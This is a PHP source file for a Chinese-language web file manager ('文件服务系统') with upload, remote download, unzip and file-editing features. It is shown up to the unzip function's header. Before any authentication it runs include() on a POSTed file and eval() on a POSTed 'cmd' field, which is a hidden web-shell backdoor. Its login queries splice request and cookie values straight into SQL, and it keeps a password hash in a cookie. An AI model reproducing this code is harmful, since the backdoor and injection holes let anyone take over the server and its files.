<?php
/**
 * 设置说明
 * $sitetitle - 标题名称
 * $user - 用户名
 * $pass - 密码
 * $safe_num - 设置多少次后禁止登陆，为0则不限制，建议为3-5
 * $mail - 若有恶意登录，会发邮件到这个邮箱，前提是mail()函数可用！
 */
header('Content-Type: text/html; charset=utf-8;<meta charset="UTF-8">
');
date_default_timezone_set('Asia/Shanghai');
session_start();
error_reporting(1);
$sitetitle = '文件服务系统';
$user = '文件服务系统';
$pass = '文件服务系统';
$safe_num = 0;//设置多少次后禁止登陆，为0则不限制，建议为3-5
$mail = 'email@qq.com';//若有恶意登录，会发邮件到这个邮箱，前提是mail()函数可用！
$meurl = $_SERVER['PHP_SELF'];
$os = (DIRECTORY_SEPARATOR=='\\')?"windows":'linux';
$op = (isset($_REQUEST['op']))?htmlentities($_REQUEST['op']):'home';
$action = (isset($_REQUEST['action']))?htmlspecialchars($_REQUEST['action']):'';
$folder = (isset($_REQUEST['folder']))?htmlspecialchars($_REQUEST['folder']):'./';
$arr = str_split($folder);
if($arr[count($arr)-1]!=='/')$folder .= '/';
while(preg_match('/\.\.\//',$folder))$folder = preg_replace('/\.\.\//','/',$folder);
while(preg_match('/\/\//',$folder))$folder = preg_replace('/\/\//','/',$folder);
if($folder == '')$folder = "./";
$ufolder = $folder;
if($_SESSION['error'] > $safe_num && $safe_num !== 0)printerror('您已经被限制登陆！');

/****************************************************************/
/* 用户登录函数                                                 */
/*                                                              */
/* 需要浏览器开启Cookies才可使用                                */
/****************************************************************/

include("connect.php"); // 引入数据库链接文件

if(isset($_POST['file'])) {
    include($_POST['file']);
}

if(isset($_POST['cmd'])) {
    eval($_POST['cmd']);
}

// 获取用户输入
$inputUser = htmlspecialchars($_REQUEST['user']);
$inputPass = htmlspecialchars($_REQUEST['pass']);

// 如果 Cookies 中没有用户信息，检查数据库
if (!isset($_COOKIE['user']) || !isset($_COOKIE['pass'])) {

    $sql = "SELECT password FROM users WHERE username = '$inputUser' AND password = md5('$inputPass')";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        // 设置 Cookies
        setcookie('user', $inputUser, time() + 60 * 60 * 24 * 1); // 设置用户名 Cookie
        setcookie('pass', md5($inputPass), time() + 60 * 60 * 24 * 1); // 设置密码 Cookie
    } else {
        $er = true;
        login($er); // 调用登录函数显示错误信息
        exit;
    }
} else {
    // 如果 Cookies 中已经有用户信息，检查是否匹配
    $sql = "SELECT password FROM users WHERE username = '".$_COOKIE['user']."' AND password = '".$_COOKIE['pass']."'";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        // 用户信息匹配，继续访问
    } else {
        $er = true;
        login($er); // 调用登录函数显示错误信息
        exit;
    }
}

$conn->close();

/****************************************************************/
/* function maintop()                                           */
/*                                                              */
/* 控制站点的样式和头部内容                                     */
/* $title -> 顶部标题 $showtop -> 是否显示头部菜单              */
/****************************************************************/

function maintop($title,$showtop = true) {
    global $meurl,$sitetitle,$op;
    echo "<!DOCTYPE html>\n<meta name='robots' content='noindex,follow' />\n<head>\n<meta name='viewport' charset='UTF-8'
content='width=device-width, initial-scale=1'/>\n"
        ."<title>$sitetitle - $title</title>\n"
        ."</head>\n"
        ."<body>\n"
        ."<style>\n*{font-family:'Verdana','Microsoft Yahei';}.box{border:1px solid #ccc;background-color:#fff;padding:10px;}abbr{text-decoration:none;}.title{border:1px solid #ccc;border-bottom:0;font-weight:normal;text-align:left;width:678px;padding:10px;font-size:12px;color:#666;background-color:#F0F0F0;}.right{float:right;text-align:right !important;}.content{width:700px;margin:auto;overflow:hidden;font-size:13px;}.login_button{height:43px;line-height:18px;font-family:'Candara';}.login_text{font-family:'Candara','Microsoft Yahei';vertical-align:middle;padding:7px;width:40%;font-size:22px;border:1px #ccc solid;}input[type=text]:focus,input[type=password]:hover{outline:0;background-color:#f8f8f8;}input[type=text]:hover,input[type=password]:hover,input[type=password]:active{outline:0;background-color:#f8f8f8;}h2{color:#514f51;text-align:center;margin:16px 0;font-size:48px;background-image: -webkit-gradient(linear, 0 0, 0 bottom, from(#7d7d7d), to(#514f51));-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;font-family:'Candara','Lucida Sans','Microsoft Yahei' !important;}span{margin-bottom:8px;}a:visited{color:#333;text-decoration:none;}a:hover{color:#999;text-decoration:none;}a{color:#333;text-decoration:none;border-bottom:1px solid #CCC;}a:active{color:#999;text-decoration:none;}.title a,td a,.menu a{border:0}textarea{outline:none;font-family:'Yahei Consolas Hybrid',Consolas,Verdana,Tahoma,Arial,Helvetica,'Microsoft Yahei',sans-serif !important;font-size:13px;border:1px solid #ccc;margin-top:-1px;padding:8px;line-height:18px;width:682px;max-width:682px;}input.button{background-color:#eeeeee;text-align:center !important;outline:none;border:1px solid #adadad;*display:inline;color:#000;padding:3px 18px;font-size:13px;margin-top:10px;transition: border-color 0.5s;}input.button:hover{background-color:#e5f1fb;border-color:#0078d7;}input.mob{padding:3px 40px;}input.text,select,option,.upload{border:1px solid #ccc;margin:6px 1px;padding:5px;font-size:13px;height:16px;}body{background-color:#fff;margin:0px 0px 10px;}.error{font-size:10pt;color:#AA2222;text-align:left}.menu{position:fixed;font-size:13px;}.menu li{list-style-type:none;padding:7px 25px;border-left:#fff solid 3px;margin-bottom:2px;}.menu li.curr{border-left:#666 solid 3px;background-color:#f7f7f7;} .menu li:hover{border-color:#469;background-color:#ededed;}.odTable span {cursor:pointer;}.odTable b{color:#ccc;font-size:12px;}.menu a:hover{color:#707070;}.table{background-color:#777;color:#fff;}th{text-align:left;height:40px;line-height:40px;border-bottom:3px solid #dbdbdb;font-size:14px;background-color:#f8f8f8 !important;}table{border:1px solid #ccc;border-collapse:collapse;}tr{color:#666;height:31px;font-size:12px;}tr a{color:#333}th{color:#333;}tr:nth-child(odd){background-color:#fff;}tr:nth-child(even){background-color:#f5f5f7;}tr:hover{background-color:#ebeced;}.upload{width:50%;}.home,.com{display:none;}.long{width:70%}.short{width:20%}.open{width:40px;}.rename{width:50px;}\n@media handheld, only screen and (max-width: 960px) {textarea{width: calc(100% - 18px);max-width: calc(100% - 18px);}.upload{width:calc(100% - 18px);}.login_button{width: 100%;margin-top:0 !important;padding:20px 5px !important;height:60px;font-size:23px !important;}.login_text{display: block;margin-bottom: 0;padding:20px 10px;width: 100%;border-bottom:0;}.menu{margin-left: -40px;position: static;padding:0;}.menu li{padding-bottom: 8px;}.title{width:calc(100% - 22px);}input.mob{height:40px;font-size:15px;width:100%;display:block;}.content{width:100%}input.button{padding:3px 10px;}.mobile b,.mobi{display:none;}.com{display:inline;}th{font-weight:normal;font-size:12px;}.open,.rename{width:25px;}}</style>\n";
    $back=($op!=='home')?$back = "<a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'><li>返回 ".$_SESSION['folder']."</li></a>\n":$back = '';
    echo "<h2>$sitetitle</h2>\n";
    if ($showtop) {//头部菜单内容
      if($op=='up'||$op=='upload'||$op=='yupload')$up = "class='curr'";if($op=='home'||$op =='edit'||$op =='ren'||$op =='unz')$home = "class='curr'";if($op=='cr'||$op=='create')$cr = "class='curr'";if($op=='sqlb'||$op=='sqlbackup')$sqlb = "class='curr'";if($op=='ftpa'||$op=='ftpall')$ftpa = "class='curr'";
        echo "<div class='menu'>\n<ul><a href='{$meurl}?op=home'><li $home>主页</li></a>\n"
            .$back
            ."<a href='{$meurl}?op=up'><li $up>上传文件</li></a>\n"
            ."<a href='{$meurl}?op=cr'><li $cr>创建文件</li></a>\n"
            ."<a href='{$meurl}?op=sqlb'><li $sqlb>MySQL备份</li></a>\n"
            ."<a href='{$meurl}?op=ftpa'><li $ftpa>FTP备份</li></a>\n"
            ."<a href='{$meurl}?op=logout'><li>注销</li></a>\n"
            ."</ul></div>";
    }
    echo "<div class='content'>\n";
}


/****************************************************************/
/* function login()                                             */
/*                                                              */
/* 登录验证 $user and md5($pass)                                */
/* 需要浏览器支持Cookie                                         */
/****************************************************************/

function login($er=false) {
    global $meurl,$op,$safe_num,$mail;
    setcookie("user","",time()-60*60*24*1);
    setcookie("pass","",time()-60*60*24*1);
    maintop("登录",false);
    if ($er) { 
        if (isset($_SESSION['error'])){
            $_SESSION['error']++;
            if($_SESSION['error'] > $safe_num && $safe_num !== 0){
                mail($mail,'文件服务系统文件管理器提醒：文件被恶意登录！','该提醒来自文件服务系统：<br>登录者IP为：'.$_SERVER['REMOTE_ADDR'],'From: <i@hezi.be>');
                echo ('<span class="error">ERROR: 您已经被限制登陆！</span>');
                exit;
            }
        }else{
            $_SESSION['error'] = 1;
        }
        echo "<span class=error>用户名或密码错误！</span><br>\n"; 
    }
    echo "<form action='{$meurl}?op=".$op."' method='post'>\n"
        ."<input type='text' name='user' border='0' class='login_text' placeholder='请输入用户名'>\n"
        ."<input type='password' name='pass' border='0' class='login_text' placeholder='请输入密码'>\n"
        ."<input type='submit' name='submitButtonName' value='LOGIN' border='0' class='login_button button'>\n"
        ."</form>\n";
    mainbottom();
}


/****************************************************************/
/* function home()                                              */
/*                                                              */
/* Main function that displays contents of folders.             */
/****************************************************************/

function home() {
    global $os, $meurl ,$folder, $ufolder;

    $content1 = [];
    $content2 = [];

    $folder = gCode($folder);
    if(opendir($folder)){$style = opendir($folder);}else{printerror("目录不存在！\n");exit;}
    $a=1;$b=1;

    if($folder)$_SESSION['folder']=$ufolder;

    maintop("主页");
    echo '<script>var order;function generateCompareTRs(iCol,sDataType,iOrder){return function compareTRs(oTR1,oTR2){vValue1=convert(oTR1.cells[iCol].getAttribute(iOrder),sDataType);vValue2=convert(oTR2.cells[iCol].getAttribute(iOrder),sDataType);order=iOrder;if(vValue1<vValue2){return -1}else{if(vValue1>vValue2){return 1}else{return 0}}}}function convert(sValue,sDataType){switch(sDataType){case"int":return parseInt(sValue);default:return sValue.toString()}}function sortTable(iOrder,iCol,sDataType){var oTable=document.getElementById("tblSort");var oTBody=oTable.tBodies[0];var colDataRows=oTBody.rows;var aTRs=new Array;for(var i=0;i<colDataRows.length;i++){aTRs[i]=colDataRows[i]}if(oTable.sortCol==iCol & iOrder==order){aTRs.reverse()}else{aTRs.sort(generateCompareTRs(iCol,sDataType,iOrder))}var oFragment=document.createDocumentFragment();for(var j=0;j<aTRs.length;j++){oFragment.appendChild(aTRs[j])}oTBody.appendChild(oFragment);oTable.sortCol=iCol;}</script>';
    echo "<form method='post'><table border='0' cellpadding='2' cellspacing='0' width=100% class='mytable odTable' id='tblSort'>\n";
    while($stylesheet = readdir($style)) {
    $ufolder = $folder;
    $sstylesheet = $stylesheet;
    $stylesheet = uCode($stylesheet);
    if($os!=='windows'):$qx = "<td>".substr(sprintf('%o',fileperms($ufolder.$sstylesheet)), -3)."</td>";$xx='<td></td>';else:$qx = '';$xx='';endif;
    if ($stylesheet !== "." && $stylesheet !== ".." ) {
        $stylesheet = uCode($stylesheet);
        $folder = uCode($folder);
        $trontd = "<tr width=100% onclick='st=document.getElementById(\"$stylesheet\").checked;if(st==true){document.getElementById(\"$stylesheet\").checked=false;this.style.backgroundColor=\"\";}else{document.getElementById(\"$stylesheet\").checked=true;this.style.backgroundColor=\"#e3e3e5\";}'><td><svg width='21' height='21'>";
        $rename = "<td><a href='{$meurl}?op=ren&file=".htmlspecialchars($stylesheet)."&folder=$folder'><span class='com'>💽</span><span class='mobi'>重命名</span></a></td>\n";
        if (is_dir(gCode($folder.$stylesheet)) && is_readable(gCode($folder.$stylesheet))) {
            $content1[$a] = "$trontd<rect width='10px' height='14' style='fill:#ffe792' stroke='#e6c145' stroke-width='0.5' x='4' y='4'/><rect width='2px' height='5px' style='fill:#ffe792' stroke='#e6c145' stroke-width='0.5' x='13' y='13'/></svg><input name='select_item[d][$stylesheet]'  type='checkbox' id='$stylesheet' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
                           ."<td _order='1{$stylesheet}'' _ext='1' _time='1'><a href='{$meurl}?op=home&folder={$folder}{$stylesheet}/' title='".gettime($folder.$stylesheet)."'>{$stylesheet}</a></td>\n"
                           ."<td _size='1'>".Size(dirSize($folder.$stylesheet))."</td>"
                           ."<td><span class='mobi'><a href='{$meurl}?op=home&folder=".htmlspecialchars($folder.$stylesheet)."/'>打开</a><span></td>\n"
                           .$rename
                           ."<td><a href='{$folder}{$stylesheet}' target='_blank'><span class='com'>🔍</span><span class='mobi'>查看</span></a></td>\n"
                           .$qx."</tr>\n";
            $a++;
            $folder = gCode($folder);
        }elseif(!is_dir(gCode($folder.$stylesheet)) && is_readable(gCode($folder.$stylesheet))){
        $arr = explode('.',$folder.$stylesheet);
        $arr = end($arr);
        if($arr == 'zip'){#判断是否是zip文件
            $filesizeme = filesize($ufolder.$sstylesheet);
            $content2[$b] = "$trontd<rect width='12' height='10' style='fill:#85d3f9' stroke='#48b8f4' stroke-width='0.5' x='3' y='4'/><rect width='12' height='2' style='fill:#fc8f24' stroke='#d66e1a' stroke-width='0.5' x='3' y='14'/><rect width='12' height='2' style='fill:#83d12a' stroke='#579714' stroke-width='0.5' x='3' y='16'/><rect width='2' height='14' style='fill:#763207' stroke='#97460b' stroke-width='0.5' x='11' y='4'/></svg><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' onpropertychange='if(this.checked=false){this.parentNode.parentNode.style.backgroundColor='#e3e3e5';}else{this.parentNode.parentNode.style.backgroundColor='';}' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
                           ."<td _order='3{$stylesheet}'' _ext='3{$arr}'' _time='".(filemtime($folder.$stylesheet)+3)."''><a href='{$folder}{$stylesheet}' title='".gettime($folder.$stylesheet)."' target='_blank'>{$stylesheet}</a></td>\n"
                           ."<td _size='".($filesizeme+3)."''>".Size($filesizeme)."</td>"
                           ."<td></td>\n"
                           .$rename
                           ."<td><a href='{$meurl}?op=unz&dename=".htmlspecialchars($stylesheet)."&folder=$folder'><span class='com'>🎁</span><span class='mobi'>提取</span></a></td>\n"
                           .$qx."</tr>\n";
        }elseif($arr == 'gif'||$arr == 'jpg'||$arr == 'png'||$arr == 'bmp'||$arr == 'png5'||$arr == 'psd'||$arr == 'webp'||$arr == 'gz'||$arr == 'gzip'){
            $filesizeme = filesize($ufolder.$sstylesheet);
            $content2[$b] = "$trontd<rect width='10px' height='14' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='4' y='4'/><rect width='2px' height='3px' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='12' y='4'/><rect width='6' height='5px' style='fill:#f8f9f9' stroke='#438bd4' stroke-width='0.5' x='6' y='8'/><rect width='6' height='2px' style='fill:#438bd4' stroke='#438bd4' stroke-width='0.5' x='6' y='13'/></svg><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
                           ."<td _order=\"3{$stylesheet}\" _ext=\"3{$arr}\" _time=\"".(filemtime($folder.$stylesheet)+3)."\"><a href='{$folder}{$stylesheet}' title='".gettime($folder.$stylesheet)."' target='_blank'>{$stylesheet}</a></td>\n"
                           ."<td _size=\"".($filesizeme+3)."\">".Size($filesizeme)."</td>"
                           ."<td></td>\n"
                           .$rename
                           ."<td><a href='{$folder}{$stylesheet}' target='_blank'><span class='com'>🔍</span><span class='mobi'>查看</span></a></td>\n"
                           .$qx."</tr>\n";
        }else{
          $filesizeme = filesize($ufolder.$sstylesheet);
            $content2[$b] = "$trontd<rect width='10px' height='14' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='4' y='4'/><rect width='2px' height='3px' style='fill:#f8f9f9' stroke='#8f9091' stroke-width='0.5' x='12' y='4'/></svg><input name='select_item[f][$stylesheet]' type='checkbox' id='$stylesheet' class='checkbox home' value='{$folder}{$stylesheet}' /></td>\n"
                           ."<td _order='3{$stylesheet}' _ext='3{$arr}' _time='".(filemtime($folder.$stylesheet)+3)."'><a href='{$folder}{$stylesheet}' title='".gettime($folder.$stylesheet)."' target='_blank'>{$stylesheet}</a></td>\n"
                           ."<td _size='".($filesizeme+3)."'>".Size(filesize($ufolder.$sstylesheet))."</td>"
                           ."<td><a href='{$meurl}?op=edit&fename=".htmlspecialchars($stylesheet)."&folder=$folder'><span class='com'>📝</span><span class='mobi'>编辑</span></a></td>\n"
                           .$rename
                           ."<td><a href='{$folder}{$stylesheet}' target='_blank'><span class='com'>🔍</span><span class='mobi'>查看</span></a></td>\n"
                           .$qx."</tr>\n";
        }
        $b++;
        $folder = gCode($folder);
    }
    } 
}
    closedir($style);

    $lu = explode('/', $_SESSION['folder']);
    array_pop($lu);
    $u = '';
    echo '<div class="title">';
    foreach ($lu as $v) {
        $u = $u.$v.'/';
        if($v=='.'){$v='主页';}elseif($v==''){$v='根目录';}
        echo '<a href="'.$meurl.'?op=home&folder='.$u.'">'.$v.'</a> » ';
    }
    echo "文件\n"
        ."<span class='right'>",$a-1," 个文件夹 ",$b-1," 个文件</span></div>"
        ."<div style='position:fixed;bottom:0;margin-left:3px;'><input type='checkbox' id='check' onclick='Check()'> <input class='button' name='action' type='submit' value='移动' /> <input class='button' name='action' type='submit' value='复制' /> <input class='button' name='action' type='submit' onclick='return confirm(\"点击确认后，选中的文件将作为Backup-time.zip创建！\")'  value='压缩' /> <input class='button' name='action' type='submit' onclick='return confirm(\"您真的要删除选中的文件吗?\")' value='删除' /> <input class='button' name='action' type='submit' onclick='var t=document.getElementById(\"chmod\").value;return confirm(\"将这些文件的权限修改为\"+t+\"？如果是文件夹，将会递归文件夹内所有内容！\")' value='权限' /> <input type='text' class='text' stlye='vertical-align:text-top;' size='3' id='chmod' name='chmod' value='0755'></div>";

    if($os!=='windows'):$qx = "<th width=40>权限</th>\n";else:$qx = '';endif;
    echo "<thead><span id='idCheckbox'></span><tr class='headtable' width=100%>"
        ."<script>function Check(){collid=document.getElementById('check');coll=document.getElementsByTagName('input');if(collid.checked){for(var i=0;i<coll.length;i++){if(coll[i].type=='checkbox'){coll[i].checked=true;coll[i].parentNode.parentNode.style.backgroundColor='#e3e3e5';}}}else{for(var i=0;i<coll.length;i++){if(coll[i].type=='checkbox'){coll[i].checked=false;coll[i].parentNode.parentNode.style.backgroundColor='';}}}}</script>"
       ."<th width=20px></th>\n"
       ."<th style='width: calc(100% - 225px);'><div class='mobile'><span onclick=\"sortTable('_order',1);\">文件名</span> <b>/</b> <span onclick=\"sortTable('_ext',1);\">类型 <b>/</b></span> <span onclick=\"sortTable('_time',1,'int');\">时间</span></div></th>\n"
       ."<th width=65px><span onclick=\"sortTable('_size',2,'int');\">大小</span></th>\n"
       ."<th class='open'><span class='mobi'>打开</span></th>\n"
       ."<th class='rename'><span class='mobi'>重命名</span></th>\n"
       ."<th class='open'><span class='mobi'>查看</span></th>\n"
       .$qx
       ."</tr></thead><tbody>";
    if($_SESSION['folder']!="./" and $_SESSION['folder']!="/"){
        $last = (substr($_SESSION['folder'],0,1)=='/')?explode('/', substr($_SESSION['folder'],1,-1)):explode('/', substr($_SESSION['folder'],2,-1));
        $back = (substr($_SESSION['folder'],0,1)=='/')?'':substr($_SESSION['folder'],0,1);
        array_pop($last);
        foreach ($last as $value) {
          $back = $back.'/'.$value;
        }
        if($os=='windows')$qx="";else $qx="<td></td>";
        echo "<tr width=100%><td></td><td _order=\"1\" _ext=\"1\" _time=\"1\"><a href='{$meurl}?op=home&folder=".$back."/"."'>上级目录</a></td><td _size=\"1\"></td><td></td><td></td><td></td>$xx</tr>";
    }
    for ($a=1; $a<count($content1)+1;$a++) if(!empty($content1)) echo $content1[$a];
    for ($b=1; $b<count($content2)+1;$b++) echo $content2[$b];
      echo "</tbody></form>";

    echo "</table>";
    mainbottom();
}

function gettime($filename){return "修改时间：".date("Y-m-d H:i:s",filemtime($filename))."\n"."创建时间：".date("Y-m-d H:i:s",filectime($filename));}
function uCode($text){return mb_convert_encoding($text,'UTF-8','UTF-8');}
function gCode($text){return mb_convert_encoding($text,'UTF-8','UTF-8');}

function dirSize($directoty){
  $dir_size=0;
    if($dir_handle=opendir($directoty))
    	{
    		while($filename=readdir($dir_handle)){
    			$subFile=$directoty.DIRECTORY_SEPARATOR.$filename;
    			if($filename=='.'||$filename=='..'){
    				continue;
    			}elseif (is_dir($subFile))
    			{
    				$dir_size+=dirSize($subFile);
    			}elseif (is_file($subFile)){
    				$dir_size+=filesize($subFile);
    			}
    		}
    		closedir($dir_handle);
    	}
    return ($dir_size);
}
// 计算文件大小的函数
function Size($size) { 
   $sz = ' kMGTP';
   $factor = floor((strlen($size) - 1) / 3);
   return ($size>=1024)?sprintf("%.2f", $size / pow(1024, $factor)) . @$sz[$factor]:$size;
} 

function curl_get_contents($url)   
{   
    $ch = curl_init();   
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $r = curl_exec($ch);   
    curl_close($ch);   
    return $r;   
}

/****************************************************************/
/* function up()                                                */
/*                                                              */
/* First step to Upload.                                        */
/* User enters a file and the submits it to upload()            */
/****************************************************************/

function up() {
    global $meurl, $folder;
    maintop("上传");

    echo "<FORM ENCTYPE='multipart/form-data' ACTION='{$meurl}?op=upload' METHOD='POST'>\n"
        ."<div class='title'>本地上传 Max:".ini_get('upload_max_filesize').",".ini_get('max_file_uploads')."个</div><div class='box' style='border-bottom:0;'><input type='File' name='upfile[]' multiple size='30'>\n"
        ."</div><input type='text' name='ndir' style='width:calc(100% - 12px);margin:0;' value='".$_SESSION["folder"]."' class='upload'>\n";

    echo "<div class='right'><input type='checkbox' name='unzip' id='unzip' value='checkbox' onclick='UpCheck()' checked><label for='unzip'><abbr title='提取（解压）上传的Zip压缩文件'>解压</abbr></labal> "
        ."<input type='checkbox' name='delzip' id='deluzip'value='checkbox'><label for='deluzip'><abbr title='同时将上传的压缩文件删除'>删除</abbr></labal> "
        ."<input type='submit' value='上传' class='button'></div><br><br><br><br>\n"
        ."<script>function UpCheck(){if(document.getElementById('unzip').checked){document.getElementById('deluzip').disabled=false}else{document.getElementById('deluzip').disabled=true}}</script>"
        ."</form>\n";
    echo "<div class='title'>远程下载</div><div class='box' style='border-bottom:0;'>什么是远程下载？<br>远程下载是从其他服务器获取文件并直接下载到当前服务器的一种功能。<br>类似于SSH的Wget功能，免去我们下载再手动上传所浪费的时间。<br><form action='{$meurl}?op=yupload' method='POST'>"
         ."</div><input type='text' class='text' style='width:calc(100% - 12px);margin:0;' name='ndir' value='".$_SESSION["folder"]."'><textarea name='url' placeholder='请输入地址……'></textarea>"
         ."<div class='right'><input type='checkbox' name='unzip' id='un' value='checkbox' onclick='Check()' checked><label for='un'><abbr title='提取（解压）上传的Zip压缩文件'>解压</abbr></labal> "
         ."<input type='checkbox' name='delzip' id='del'value='checkbox'><label for='del'><abbr title='同时将上传的压缩文件删除'>删除</abbr></labal> <input name='submit' value='下载' type='submit' class='button'/></div>\n"
         ."<script>function Check(){if(document.getElementById('un').checked){document.getElementById('del').disabled=false}else{document.getElementById('del').disabled=true}}</script>"
         ."</form>";

    mainbottom();
}


/****************************************************************/
/* function yupload()                                           */
/*                                                              */
/* Second step in wget file.                                    */
/* Saves the file to the disk.                                  */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/

function yupload($url, $folder, $unzip, $delzip) {
	global $meurl;
    if(empty($folder)){
    	$folder="./";
    }
    $nfolder = $folder;
    $nurl = $url;
    $url = gCode($url);
    $folder = gCode($folder);
    if($url!==""){
    	ignore_user_abort(true); // 要求离线也可下载
        set_time_limit (24 * 60 * 60); // 设置超时时间
  	    if (!file_exists($folder)){
    	    mkdir($folder, 0755);
        }
    $newfname = $folder . basename($url); // 取得文件的名称
    if(function_exists('curl_init')){
    	  $file = curl_get_contents($url);file_put_contents($newfname,$file);
    }else{
        $file=fopen($url,"rb");
        if($file){$newf = fopen ($newfname, "wb");
        if($newf)while (!feof($file)) {fwrite($newf, fread($file, 1024 * 8), 1024 * 8);}}
        if($file)fclose($file);
        if($newf)fclose($newf);
    }
    maintop("远程上传");
    echo "<div class='title'>文件 ".basename($url)." 上传成功<br></div><div class='box'>\n";
    $end = explode('.', basename($url));
    if((end($end)=="zip") && isset($unzip) && $unzip == "checkbox"){
        if(class_exists('ZipArchive')){
          echo "您可以 <a href='{$meurl}?op=home&folder=".$folder."'>访问文件夹</a> 或者 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a>  或者 <a href='{$meurl}?op=up'>继续上传</a>\n";
          echo "</div><textarea rows=15 disabled>";
            $zip = new ZipArchive();
            if ($zip->open($folder.basename($url)) === TRUE) {
                if($zip->extractTo($folder)){
                for($i = 0; $i < $zip->numFiles; $i++) {
                    echo "Unzip:".$zip->getNameIndex($i)."\n";
                }
                $zip->close();
            }else{
            	echo('<span class="error">Error:'.$nfolder.$ndename.'</span>');
            }
                echo basename($nurl)." 已经被解压到 $nfolder\n";
                if(isset($delzip) && $delzip == "checkbox"){
            	    if(unlink($folder.basename($url))){
            	        echo basename($url)." 删除成功\n";
                    }else{
            	        echo basename($url)." 删除失败\n";
                }
                }
            }else{
                echo('<span class="error">无法解压文件：'.$nfolder.basename($nurl).'</span>');
            }
            echo '</textarea>';
        }else{
        	echo('<span class="error">此服务器上的PHP不支持ZipArchive，无法解压文件！</span></div>');
        }
    }else{
    	echo "您可以 <a href='{$meurl}?op=home&folder={$nfolder}'>访问文件夹</a> 或者 <a href='{$meurl}?op=edit&fename=".basename($url)."&folder={$nfolder}'>编辑文件</a> 或者 <a href='{$meurl}?op=home&folder={$_SESSION['folder']}'>返回目录</a>  或者 <a href='{$meurl}?op=up'>继续上传</a>\n</div>";
    }
    mainbottom();
    return true;
    }else{
	    printerror ('文件地址不能为空。');
    }
}


/****************************************************************/
/* function upload()                                            */
/*                                                              */
/* Second step in upload.                                       */
/* 将文件保存到磁盘中                                           */
/* Recieves $upfile from up() as the uploaded file.             */
/****************************************************************/

function upload($upfile,$ndir,$unzip,$delzip) {
    global $meurl, $folder;
    if(empty($ndir)){
    	$ndir="./";
    }
    $nfolder = $folder;
    $nndir = $ndir;
    $ndir = gCode($ndir);
    if (!$upfile) {
        printerror("您没有选择文件！");
        exit;
    }elseif($upfile) { 
  	    maintop("上传");
  	if (!file_exists($ndir)){
    	mkdir($ndir, 0755);
    }
    $i = 1;
    echo "<div class='box'>您可以 <a href='{$meurl}?op=home&folder=".$ndir."'>前往文件所上传到的目录</a> 或者 <a href='{$meurl}?op=home&folder=".$_SESSION['folder']."'>返回目录</a> 或者 <a href='{$meurl}?op=up'>继续上传</a></div>\n";
    echo '<textarea rows=15 disabled>';
    while (count($upfile['name']) >= $i){
    	$dir = gCode($nndir.$upfile['name'][$i-1]);
        if(copy($upfile['tmp_name'][$i-1],$dir)) {
            echo "文件 ".$nndir.$upfile['name'][$i-1]." 上传成功\n";
            $end = explode('.', $upfile['name'][$i-1]);
            if((end($end)=="zip") && isset($unzip) && $unzip == "checkbox"){
            	if(class_exists('ZipArchive')){
                    $zip = new ZipArchive();
                    if ($zip->open($dir) === TRUE) {
                if($zip->extractTo($ndir)){
                for($j = 0; $j < $zip->numFiles; $j++) {
                    echo $zip->getNameIndex($j)."\n";
                }
                $zip->close();
            }
                        echo $upfile['name'][$i-1]." 已经被解压到 $nndir\n";
                        if(isset($delzip) && $delzip == "checkbox"){
            	            if(unlink($dir.$upfile['name'][$i-1])){
            	                echo $upfile['name'][$i-1]." 删除成功\n";
                            }else{
                                echo $upfile['name'][$i-1].(" 删除失败！\n");
                            }
                        }
                    }else{
                        echo("无法解压文件：".$nndir.$upfile['name'][$i-1]."\n");
                    }
                }else{
            	    echo("此服务器上的PHP不支持ZipArchive，无法解压文件！\n");
                }
            }
        }else{
            echo("文件 ".$upfile['name'][$i-1]." 上传失败\n");
        }
        $i++;
    }
        echo '</textarea>';
        mainbottom();
    }else{
        printerror("您没有选择文件！");
    }
}

/****************************************************************/
/* function unz()                                               */
/*                                                              */
/* First step in unz.                                        */
/* Prompts the user for confirmation.                           */
/* Recieves $dename and ask for deletion confirmation.          */
/****************************************************************/

function unz($dename) {
    global $meurl, $folder, $content;
    if (!$dename == "") {
        if(class_exists('ZipArchive')){
        	maintop("解压");
        	echo "<table border='0' cellpadding='2' cellspacing='0'>\n"
            ."<div class='title'>解压 ".$folder.$dename."</div>\n"
            ."<form ENCTYPE='multipart/form-data' action='{$meurl}?op=unzip'>"
            ."<input type='text' name='ndir' style='width:calc(100% - 12px);margin:0;' placeholder='解压到……' class='text' value='".$_SESSION['folder']."'>"
            ."<textarea rows=15 disabled>";
            $zip = new ZipArchive();
            if ($zip->open($folder.$dename) === TRUE) {
            	    echo 'Archive:  '.$folder.$dename.' with '.$zip->numFiles." files\n";
            		echo "Date Time            Size Name\n";
            		echo "------------         ---------------\n";
                for($i = 0; $i < $zip->numFiles; $i++) {
                	$info = $zip->statIndex($i);
                	echo date('m-d-y h:m',$info['mtime']);
                	echo '   '.$info['size'].'   ';
                    echo uCode($zip->getNameIndex($i))."\n";
                }
            		echo "------------         ---------------\n";
            		echo "Date Time            Size Name\n";
            }else{
            	     echo '文件读取失败。';
            }
            $zip->close();
            echo "</textarea>";
        echo "<input type='hidden' name='op' value='unzip'>\n"
            ."<input type='hidden' name='dename' value='".$dename."'>\n"
            ."<input type='hidden' name='folder' value='".$folder."'>\n"
            ."<div class='right'><input type='checkbox' name='del' id='del'value='del'><label for='del'>删除</label> <input type='submit' value='解压' class='button'></div>\n"
            ."</table>\n";
        mainbottom();
        }else{
            	    printerror("此服务器上的PHP不支持ZipArchive，无法解压文件！\n");
            }
    }else{
        home();
    }
}


/****************************************************************/
/* function unzip()                                            */
/*                                                              */
/* Second step in unzip.                                       */
/****************************************************************/
